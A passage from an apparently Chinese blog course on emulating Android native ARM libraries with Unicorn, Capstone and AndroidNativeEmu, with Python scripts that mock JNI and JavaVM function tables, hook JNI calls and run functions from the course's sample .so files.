mu.reg_write(arm_const.UC_ARM_REG_R2,address+size+<span class="number">0x1000</span>) <span class="comment">#jstring</span></span><br><span class="line">    sp = address + size - <span class="number">16</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP, sp)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code,<span class="literal">None</span>,<span class="number">0</span>,<span class="number">300</span>*<span class="number">4</span>) <span class="comment">#对指定范围 进行hook</span></span><br><span class="line">    </span><br><span class="line">    addrstart = address + <span class="number">0x0424</span> + <span class="number">1</span></span><br><span class="line">    addrend = address + <span class="number">0x045c</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> datetime</span><br><span class="line">        starttime=datetime.datetime.now()</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;emulat over&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="comment">#打印最后的返回值字符串</span></span><br><span class="line">        r0value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">        result=readstring(mu,r0value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;result--&gt;&quot;</span>+result)</span><br><span class="line">        endtime=datetime.datetime.now()</span><br><span class="line">        <span class="built_in">print</span>(endtime-starttime)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    call_jni()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第五课时"><a href="#第五课时" class="headerlink" title="第五课时"></a>第五课时</h2><h3 id="Unicorn模拟调用JNI-Onload，"><a href="#Unicorn模拟调用JNI-Onload，" class="headerlink" title="Unicorn模拟调用JNI_Onload，"></a>Unicorn模拟调用JNI_Onload，</h3><p>其中会涉及到Javavm，具体实现和Jnienv差不多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> unicorn.arm_const</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address&gt;=<span class="number">700</span>*<span class="number">4</span> <span class="keyword">and</span> address&lt;=<span class="number">710</span>*<span class="number">4</span>:</span><br><span class="line">        index=(address-<span class="number">700</span>*<span class="number">4</span>)/<span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call javavm function-----------&quot;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">6</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call javavm-&gt;GetEnv-----------&quot;</span> + <span class="built_in">str</span>(index))</span><br><span class="line">            r1value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)  <span class="comment">#读出来env指针</span></span><br><span class="line">            mu.mem_write(r1value,struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">601</span>*<span class="number">4</span>))          <span class="comment">#让env的地址为自定义的601*4 这样就可以指向定义的env结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address&gt;=<span class="number">0</span> <span class="keyword">and</span> address&lt;=<span class="number">300</span>*<span class="number">4</span>:</span><br><span class="line">        index=address/<span class="number">4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call jnienv funciton-----------&quot;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">6</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jnienv FindClass is called&quot;</span>)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            classname=readstring(mu,r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jnienv FindClass:&quot;</span>+classname)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0,<span class="number">666</span>)</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">215</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jnienv RegisterNatives:&quot;</span>)</span><br><span class="line">            r0value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            r2value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R2)</span><br><span class="line">            <span class="comment"># funcname_bytearray=mu.mem_read(r2value,4)</span></span><br><span class="line">            <span class="comment"># funcname_addr=struct.unpack(&quot;I&quot;,funcname_bytearray)</span></span><br><span class="line">            <span class="comment"># funcname=readstring(mu,funcname_addr)</span></span><br><span class="line">            r3value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R3)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;env:&quot;</span>+<span class="built_in">str</span>(r0value)+<span class="string">&quot;---jclass&quot;</span>+<span class="built_in">str</span>(r1value)+<span class="string">&quot;---&quot;</span>+<span class="built_in">str</span>(r2value)+<span class="string">&quot;---&quot;</span>+<span class="built_in">str</span>(r3value)+<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">676</span>/<span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars-----------------&quot;</span>)</span><br><span class="line">            r0value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            r2value=mu.reg_read(unicorn.arm_const.UC_ARM_REG_R2)</span><br><span class="line">            content=readstring(mu,r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0,r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value)+<span class="string">&#x27;-----&#x27;</span>+content+<span class="string">&#x27;-----&#x27;</span>+<span class="built_in">str</span>(r2value))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call GetStringUTFChars over-----------------&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">668</span>/<span class="number">4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF-----------------&quot;</span>)</span><br><span class="line">            r0value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R0)</span><br><span class="line">            r1value = mu.reg_read(unicorn.arm_const.UC_ARM_REG_R1)</span><br><span class="line">            content = readstring(mu, r1value)</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, r1value)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(r0value) + <span class="string">&#x27;-----&#x27;</span> + content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;call NewStringUTF over-----------------&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call jni interface------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_block</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_blocak------------------------------------------------------&quot;</span>)</span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[hook_blocak_addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="comment">#void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type,uint64_t address, int size, int64_t value, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_jni</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;unicorn05.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0xc00</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0xc00</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line"></span><br><span class="line">    JNIFUNCTIONLISTBASE=<span class="number">0x0</span></span><br><span class="line">    JNIFUNCTIONLISTSIZE=<span class="number">0x1000</span></span><br><span class="line">    JNINATIVEINTERFACE=<span class="number">301</span>   <span class="comment">#jni函数位置</span></span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>, <span class="number">0x1000</span>)</span><br><span class="line">    <span class="comment">#初始化jni接口中每个函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">300</span>,<span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>+JNIFUNCTIONLISTBASE,<span class="string">b&quot;\x00\xb5\x00\xbd&quot;</span>)</span><br><span class="line">    <span class="comment">#初始化jninativeinterface结构体</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>,<span class="number">600</span>,<span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i*<span class="number">4</span>,struct.pack(<span class="string">&quot;I&quot;</span>,(i-<span class="number">300</span>)*<span class="number">4</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="comment">#初始化jnienv* env  指向jninativeinterface首部</span></span><br><span class="line">    jnienv_pointer=<span class="number">601</span>*<span class="number">4</span></span><br><span class="line">    mu.mem_write(jnienv_pointer,struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">300</span>*<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">    JAVAVMFUNCTIONLISTBASE=<span class="number">700</span>*<span class="number">4</span></span><br><span class="line">    <span class="comment"># 初始化jni接口中每个函数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i * <span class="number">4</span> + JAVAVMFUNCTIONLISTBASE, <span class="string">b&quot;\x00\xb5\x00\xbd&quot;</span>)</span><br><span class="line">    <span class="comment"># 初始化jniinvokeinterface结构体</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>, <span class="number">1</span>):</span><br><span class="line">        mu.mem_write(i * <span class="number">4</span>+JAVAVMFUNCTIONLISTBASE+<span class="number">40</span>, struct.pack(<span class="string">&quot;I&quot;</span>, i * <span class="number">4</span> + JAVAVMFUNCTIONLISTBASE+ <span class="number">1</span>)) <span class="comment">#和前面对应</span></span><br><span class="line">    <span class="comment"># 初始化javavm *vm 指向javavm结构体的首部</span></span><br><span class="line">    javavm_pointer = <span class="number">700</span> * <span class="number">4</span>+<span class="number">80</span></span><br><span class="line">    mu.mem_write(javavm_pointer, struct.pack(<span class="string">&quot;I&quot;</span>, JAVAVMFUNCTIONLISTBASE+<span class="number">40</span>))</span><br><span class="line"></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address, CODE)</span><br><span class="line">    mu.mem_map(address+size+<span class="number">0x1000</span>,<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,javavm_pointer)  <span class="comment">#存放指針地址</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x0</span>)</span><br><span class="line">    sp = address + size - <span class="number">16</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP, sp)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    <span class="comment">#mu.hook_add(UC_HOOK_MEM_WRITE,hook_mem)</span></span><br><span class="line">    addrstart = address + <span class="number">0x0c00</span> + <span class="number">1</span></span><br><span class="line">    addrend = address + <span class="number">0x0c66</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> datetime</span><br><span class="line">        starttime=datetime.datetime.now()</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;emulat over&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        endtime = datetime.datetime.now()</span><br><span class="line">        <span class="built_in">print</span>(endtime-starttime)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    call_jni()</span><br></pre></td></tr></table></figure><h2 id="第六课时"><a href="#第六课时" class="headerlink" title="第六课时"></a>第六课时</h2><p><strong>AndroidNativeEmu调用JNI函数</strong></p><p>在项目中给的基础上修改就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_HOOK_CODE</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="keyword">from</span> examples <span class="keyword">import</span> debug_utils</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers  <span class="comment">#实现打印字符串</span></span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method, native_read_args <span class="comment">#@native_method标签</span></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlen</span>(<span class="params">uc,buffer</span>):</span><br><span class="line">    content=memory_helpers.read_utf8(uc,buffer)</span><br><span class="line">    length=<span class="built_in">len</span>(content)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_Z4testv</span>(<span class="params">uc</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize emulator</span></span><br><span class="line">emulator = Emulator(vfp_inst_set=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#进行hook</span></span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;strlen&#x27;</span>, emulator.hooker.write_function(strlen) + <span class="number">1</span>)</span><br><span class="line">emulator.modules.add_symbol_hook(<span class="string">&#x27;_Z4testv&#x27;</span>, emulator.hooker.write_function(_Z4testv) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#emulator.load_library(&quot;example_binaries/32/libc.so&quot;, do_init=False)</span></span><br><span class="line"><span class="comment">#lib_module = emulator.load_library(&quot;example_binaries/32/libnative-lib.so&quot;, do_init=False)</span></span><br><span class="line">lib_module = emulator.load_library(<span class="string">&quot;unicorncourse/unicorncourse06.so&quot;</span>, do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show loaded modules.</span></span><br><span class="line">logger.info(<span class="string">&quot;Loaded modules:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> emulator.modules:</span><br><span class="line">    logger.info(<span class="string">&quot;[0x%x] %s&quot;</span> % (module.base, module.filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add debugging.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    instruction = uc.mem_read(address, size)</span><br><span class="line">    instruction_str = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;&#123;:02x&#125; &#x27;</span>.<span class="built_in">format</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> instruction)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;# Tracing instruction at 0x%x, instruction size = 0x%x, instruction = %s&#x27;</span> % (address, size, instruction_str))</span><br><span class="line"></span><br><span class="line"><span class="comment">#emulator.uc.hook_add(UC_HOOK_CODE, debug_utils.hook_code)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Runs a method of &quot;libnative-lib.so&quot; that calls an imported function &quot;strlen&quot; from &quot;libc.so&quot;.</span></span><br><span class="line"><span class="comment">#emulator.call_symbol(lib_module, &#x27;_Z4testv&#x27;) #运行这个函数</span></span><br><span class="line">funcname=<span class="string">&#x27;Java_com_example_unicorncourse04_MainActivity_stringFromJNI&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#两种调用方式，类比frida</span></span><br><span class="line">result=emulator.call_symbol(lib_module, <span class="string">&#x27;Java_com_example_unicorncourse04_MainActivity_stringFromJNI&#x27;</span>,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&quot;testjnifunction&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;second--------------------------------&quot;</span>)</span><br><span class="line">result=emulator.call_native(lib_module.base+<span class="number">0x0b58</span>+<span class="number">1</span>,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&quot;testjnifunction&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第七课时"><a href="#第七课时" class="headerlink" title="第七课时"></a>第七课时</h2><p>AndroidNativeEmu模拟JNIOnLoad动态注册jni函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 